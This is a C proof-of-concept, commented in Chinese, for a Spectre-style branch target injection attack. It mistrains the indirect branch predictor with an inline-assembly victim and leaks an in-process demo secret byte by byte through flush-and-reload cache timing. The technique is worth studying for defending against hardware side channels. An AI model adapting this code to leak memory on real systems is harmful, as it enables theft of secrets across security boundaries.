#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h>
#include "../utils/cache_instr.h"

#define CACHE_HIT_THRESHOLD 120
#define GAP 4096

// 让通道按 4KiB 对齐，减少相邻 cacheline 干扰（可选但更稳）
__attribute__((aligned(4096)))
uint8_t channel[256 * GAP];

uint64_t *target;                 // 一级槽位指针：*target 存的是 “&target_lvl2”
static __attribute__((aligned(64))) volatile uint64_t target_lvl2; // 二级槽位：真目标函数地址
char *secret = "The Magic Words are Squeamish Ossifrage.";

// 恶意片段代码（gadget）：按 *addr 访问通道，留下缓存痕迹
__attribute__((noinline))
int volatile gadget(char *addr)
{
    return channel[(uint8_t)(*addr) * GAP];
}

// 正常代码片段
__attribute__((noinline))
uint64_t safe_target(void)
{
    return 42;
}

// 受害者：在这里延后“分支目标解析”
__attribute__((noinline))
void victim(char *addr)
{
    int result;
    __asm__ volatile(
        // 冷却一级槽位（*target 指向 &target_lvl2）
        "clflush (%1)            \n\t"
        // 从内存慢加载一级槽位，得到 &target_lvl2
        "mov    (%1), %%rax      \n\t"
        // 冷却二级槽位（target_lvl2 存放真实函数地址）
        "clflush (%%rax)         \n\t"
        // 关键：让 call 自己去内存读目标（一次冷 miss）
        "call   *(%%rax)         \n\t"
        "mov    %%eax, %0        \n\t"   // 用一下返回值，防编译器删掉调用
        : "=r"(result)
        : "r"(target), "D"(addr)         // RDI=addr 传给 gadget
        : "memory","cc",
          "rax","rcx","rdx","rsi","r8","r9","r10","r11"
    );
}

void readCacheByte(int cache_hit_threshold, char *addr_to_read, char value[2], int score[2])
{
    int results[256];
    int tries, i, j, k, mix_i;
    uint64_t start, end;
    char dummyChar = '$';

    // 初始化
    for (i = 0; i < 256; i++) {
        results[i] = 0;
        channel[i * GAP] = 1;
    }

    for (tries = 999; tries > 0; tries--) {

        // ====== 训练阶段：让 IBP/BTB 认为会跳到 gadget ======
        target_lvl2 = (uint64_t)&gadget;       // 二级槽位 = gadget
        *target     = (uint64_t)&target_lvl2;  // 一级槽位 = &target_lvl2
        mfence();
        for (j = 128; j > 0; j--) {            // 稍多训练更稳
            victim(&dummyChar);
        }
        mfence();

        // ====== 清理通道缓存 ======
        for (i = 0; i < 256; i++)
            flush(&channel[i * GAP]);
        mfence();

        // ====== 攻击阶段：真实目标换回安全函数 ======
        target_lvl2 = (uint64_t)&safe_target;
        *target     = (uint64_t)&target_lvl2;
        mfence();

        // victim 内部：clflush+内存间接 call → 推测窗口更大
        victim(addr_to_read);
        mfence();

        // ====== 侧信道恢复 ======
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            uint8_t *p = &channel[mix_i * GAP];
            start = rdtscp();
            maccess(p);
            end = rdtscp();
            if (end - start <= cache_hit_threshold)
                results[mix_i]++;
        }

        // 找出 top2
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) { k = j; j = i; }
            else if (k < 0 || results[i] >= results[k]) { k = i; }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break;
    }

    value[0] = (uint8_t)j;  score[0] = results[j];
    value[1] = (uint8_t)k;  score[1] = results[k];
}

int main(int argc, char *argv[])
{
    // *target 是“一级槽位”：里面存放的是 &target_lvl2（不是函数地址本身）
    target = (uint64_t *)malloc(sizeof(uint64_t));

    int cache_hit_threshold = CACHE_HIT_THRESHOLD;
    char *addr = secret;
    int len = 40;
    int score[2];
    uint8_t value[2];

    if (argc >= 2) {
        sscanf(argv[1], "%d", &cache_hit_threshold);
    }
    printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);

    printf("Reading %d bytes:\n", len);
    while (--len >= 0) {
        printf("Reading at malicious_x = %p... ", (void *)addr);
        readCacheByte(cache_hit_threshold, addr++, (char*)value, score);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' count=%d ",
               value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0) {
            printf("\t(second best: 0x%02X='%c' count=%d)",
                   value[1], (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
        }
        printf("\n");
    }
    free(target);
    return 0;
}
